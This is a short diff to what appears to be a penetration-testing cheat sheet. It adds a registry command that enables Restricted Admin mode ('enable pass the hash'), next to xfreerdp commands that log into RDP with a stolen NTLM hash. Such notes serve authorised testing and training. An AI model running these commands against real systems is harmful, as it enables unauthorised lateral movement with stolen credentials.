@@ -829,6 +829,10 @@ New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Disab
 ```
 
 ```
+# enable pass the hash:
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+
 xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
 xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
 xfreerdp /clipboard /async-update /async-input /auto-reconnect /audio-mode:1 -glyph-cache /bpp:8 /network:modem /compression -themes -wallpaper /u:admin /pth:hhhhhhhhh  /cert:ignore /v:10.11.1.000 /workarea
